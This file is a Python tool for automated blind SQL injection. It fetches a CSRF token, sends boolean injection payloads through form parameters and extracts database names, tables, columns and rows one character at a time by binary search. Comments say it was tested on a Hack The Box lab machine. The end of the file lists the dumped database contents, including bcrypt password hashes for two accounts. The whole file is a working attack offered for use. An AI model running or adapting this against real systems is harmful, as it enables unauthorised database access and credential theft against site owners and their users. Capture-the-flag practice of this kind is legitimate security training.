import requests
import argparse
from string import Template
from colorama import Fore, Style
import time

# python3 blindsqli.py -r ~/Documents/HTB_Machines/usage/request -p email -xT='_token' -cF 'Email address does not match in our records!' -cT 'We have e-mailed your password reset link to' -D='usage_blog' -v -D 'usage_blog' -T 'admin_users' -C username password --rows
# sqlmap -r request -p email --level 5 --risk 3 --csrf-token="_token" --csrf-url="http://usage.htb/forget-password" --csrf-method=GET
def main():
    parser = argparse.ArgumentParser(description='Automate blind SQL injection')
    parser.add_argument('-r', '--request', help='file containg http request', dest='request', required=True)
    parser.add_argument('-p', '--parameters', help='parameters to test for SQLi', dest='parameters', nargs='+', required=True)
    parser.add_argument('-xT', '--csrf-token', help='name of anti-csrf token', dest='csrfToken', default='csrf', required=False)
    parser.add_argument('-xU', '--csrf-url', help='URL to find anti-csrf token', dest='csrfUrl', required=False)
    parser.add_argument('-xM', '--csrf-method', help='Method used to gather anti-csrf token', dest='csrfMethod', default='GET', required=False)
    parser.add_argument('-s', '--schema', help='http/https', dest='schema', default='http', required=False)
    parser.add_argument('-cT', '--condition-true', help='text pattern to look for in response to determine if injection evaluates to true', dest='condTrue', required=False)
    parser.add_argument('-cF', '--condition-false', help='text pattern to look for in response to determine if injection evaluates to false', dest='condFalse', required=False)
    parser.add_argument('-v', '--verbose', help='if set show debug info', dest='verbose', action=argparse.BooleanOptionalAction, default=False, required=False)
    parser.add_argument('-D', help='use database to further enumeration', dest='db', required=False)
    parser.add_argument('-T', help='use table to further enumeration', dest='table', required=False)
    parser.add_argument('-C', help='columns to select when dumping table', dest='columns', nargs='*', required=False)
    parser.add_argument('--dbs', help='enumerate existing databases', dest='enumDBs', action=argparse.BooleanOptionalAction, default=False, required=False)
    parser.add_argument('--tables', help='enumerate existing tables within selected database', dest='enumTables', action=argparse.BooleanOptionalAction, default=False, required=False)
    parser.add_argument('--row-count', help='enumerate count(*) on selected table', dest='enumTableRowCount', action=argparse.BooleanOptionalAction, default=False, required=False)
    parser.add_argument('--columns', help='enumerate columns definition on selected table', dest='enumTableColumns', action=argparse.BooleanOptionalAction, default=False, required=False)
    parser.add_argument('--rows', help='dump rows on selected table', dest='enumTableRows', action=argparse.BooleanOptionalAction, default=False, required=False)
    
    args = parser.parse_args()

    request = open(args.request)

    http_definition = request.readline()
    httpSQLi = {}
    httpSQLi['method'] = http_definition.replace('\n','').split(' ')[0]
    httpSQLi['path'] = http_definition.replace('\n','').split(' ')[1]

    headers = request.readlines()
    for h in headers:
        if h.find('Host: ') != -1:
            httpSQLi['host'] = h.replace('\n','').split(': ')[1]
        if h.find('User-Agent: ') != -1:
            httpSQLi['userAgent'] = h.replace('\n','').split(': ')[1]
        if h.find('Cookie: ') != -1:
            httpSQLi['cookies'] = h.replace('\n','').split(': ')[1]
        if h.find('Content-Type: ') != -1:
            httpSQLi['contentType'] = h.replace('\n','').split(': ')[1]
            
    
        
    url = f'{args.schema}://{httpSQLi["host"]}{httpSQLi["path"]}'

    headers = {}
    headers["host"] = httpSQLi["host"]
    headers["User-Agent"] = httpSQLi["userAgent"]
    headers["Cookie"] = httpSQLi["cookies"]
    headers["Content-Type"] = httpSQLi['contentType']
    
    req = requests.request(method=args.csrfMethod, url=url, headers=headers)

    startToken = req.text.find(args.csrfToken)
    endToken = req.text[startToken:].find('\n') + startToken
    tokenLine = req.text[startToken:endToken]
    startToken = tokenLine.find('value=')
    csrfToken = tokenLine[startToken:].split('"')[1]
    httpSQLi["csrfToken"] = csrfToken

    # no more data [0], space [1], parenthesis [2:4], comma [4], numbers [5:15], uppercase [15:41], underscore [41], lowercase [41:58]
    #ascii_range = [0] + [32] + [40,41] + [44] + list(range(48,58)) + list(range(65,91)) + [95] + list(range(97,123)) # One less request per letter, but may cause incorrect data if you don't know what characters are possible
    ascii_range = range(128)
    selectedPayloads = []
    if args.enumDBs:
        selectedPayloads.append(0)
    if args.enumTables:
        if args.db != None:
            selectedPayloads.append(1)
        else:
            print('Database not provided. Quiting!')
    if args.enumTableRowCount:
        if args.db != None and args.table != None:
            selectedPayloads.append(2)
        else:
            print('Database and/or table not provided. Quiting!')
    if args.enumTableColumns:
        if args.db != None and args.table != None:
            selectedPayloads.append(3)
        else:
            print('Database and/or table not provided. Quiting!')
    if args.enumTableRows:
        if args.db != None and args.table != None and args.columns != None:
            selectedPayloads.append(4)
        else:
            print('Database, table and/or columns not provided. Quiting!')

    # if no enum mode is selected, print info an quit
    if len(selectedPayloads) == 0:
        print(f'url: {url}')
        print(f'Updated csrf-token: {httpSQLi["csrfToken"]}')
        print(f'Headers: {headers}')
        return

    # select 1 as email where 'email' = 'payload' OR (SELECT substring((SELECT group_concat(schema_name separator ', ') FROM information_schema.schemata),1,1))='a';
    base_payload = Template("a' OR (SELECT ascii(substring(($query),$index,1)))>$ascii;-- -")
    payloads = [
        "SELECT group_concat(schema_name separator ',') FROM information_schema.schemata" # --dbs
        ,f"SELECT group_concat(table_name separator ',') FROM information_schema.tables WHERE table_schema = '{args.db}'" # --tables
        ,f"SELECT count(*) FROM {args.db}.{args.table}" # --row-count
        ,f"SELECT group_concat(t.col separator ',') FROM (SELECT concat(column_name,' ',column_type) as col FROM information_schema.columns WHERE table_schema = '{args.db}' AND table_name = '{args.table}') t" # --columns
        ,Template(f"SELECT concat_ws(',',{','.join(args.columns)}) FROM {args.db}.{args.table} LIMIT $offset,1") # --rows
    ]

    st = time.time()
    totalRequests = 0
    for sp in selectedPayloads:
        result = ''
        lastFound = -1
        i = 1
        httpStatus = 0
        while lastFound != 0 and httpStatus < 500: # 0 = null char
            bottom = 0
            top = len(ascii_range) - 1
            # a = 41 # start lowercase letters -1 (most probable)
            # a = int(len(ascii_range)/2.0)
            a = ord('a')-1
            
            while top != bottom:
                query = payloads[sp]
                if sp == 4:
                    query = payloads[sp].substitute(offset=0)

                payload = base_payload.substitute(query=query, index=i, ascii=ascii_range[a])
                if args.verbose:
                    print()
                    print(payload)
                #payload_encoded = urllib.parse.quote_plus(payload)
                #httpBody = f'{args.csrfToken}={httpSQLi["csrfToken"]}&{args.parameters[0]}={payload_encoded}'

                body = dict.fromkeys([args.csrfToken] + args.parameters)
                body[args.csrfToken] = httpSQLi['csrfToken']
                for p in args.parameters:
                    body[p] = payload
                #body = {"_token":httpSQLi['csrfToken'],"email":payload}
                
                req = requests.request(method=httpSQLi['method'], url=url, headers=headers, data=body)
                totalRequests += 1

                httpStatus = req.status_code
                if args.verbose:
                    print(f'http status: {httpStatus}')
                if httpStatus >= 500:
                    if args.verbose:
                        print('Server error, check SQL sintax')
                    break
                
                success = None
                if req.text.find(args.condTrue) != -1:
                    if args.verbose:
                        print('injection return true')
                    success = True

                if req.text.find(args.condFalse) != -1:
                    if args.verbose:   
                        print('injection return false')
                    success = False

                if success:
                    bottom = a + 1
                else:
                    top = a
                a = bottom + int((top - bottom)/2.0)
                if args.verbose:
                    print(ascii_range[a], chr(ascii_range[a]))

            lastFound = ascii_range[a]
            result += chr(ascii_range[a])
            i += 1
            print(Fore.GREEN + result + Style.RESET_ALL)
    
    et = time.time()
    timeRaw = et - st
    seconds = int((timeRaw%60)*100)/100.0
    minutes = int(timeRaw/60.0 - seconds/60.0) % 60
    hours = int(timeRaw/3600.0 - minutes/60.0)
    print(f'{totalRequests} requests issued within {hours}H {minutes}m {seconds}s')

if __name__ == '__main__':
    main()


# Tool tested with "usage" HTB Machine

# DBs: information_schema,performance_schema,usage_blog
# Tables: admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users,blog,failed_jobs,migrations,password_reset_tokens,personal_access_tokens,users
# Row Count:
'''
    admin_menu: 7
    admin_operation_log: 287
    admin_permissions: 5
    admin_role_menu: 2
    admin_role_permissions: 1
    admin_role_users: 1
    admin_roles: 1
    admin_user_permissions: 0
    admin_users: 1
    blog: 4
    failed_jobs: 0
    migrations: 6
    password_reset_tokens: 0
    personal_access_tokens: 0
    users: 5
'''
# Columns:
'''
    admin_menu: 
    admin_operation_log: 
    admin_permissions: 
    admin_role_menu: 
    admin_role_permissions: 
    admin_role_users: 
    admin_roles: 
    admin_user_permissions: 
    admin_users:(8 cols) avatar varchar(255),created_at timestamp,id int unsigned,name varchar(255),password varchar(60),remember_token varchar(100),updated_at timestamp,username varchar(190)
    blog: 
    failed_jobs: 
    migrations: 
    password_reset_tokens: 
    personal_access_tokens: 
    users:(8 cols) created_at timestamp,email varchar(255),email_verified_at timestamp,id bigint unsigned,name varchar(255),password varchar(255),remember_token varchar(100),updated_at timestamp
'''
# Rows:
'''
    admin_menu: 
    admin_operation_log: 
    admin_permissions: 
    admin_role_menu: 
    admin_role_permissions: 
    admin_role_users: 
    admin_roles: 
    admin_user_permissions: 
    admin_users: admin,$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
    blog: 
    failed_jobs: 
    migrations: 
    password_reset_tokens: 
    personal_access_tokens: 
    users: raj,$2y$10$rbNCGxpWp1HSpO1gQX4uPO0pDg1nszoI0UhwHvfHDdfdfo9VmDJsa
'''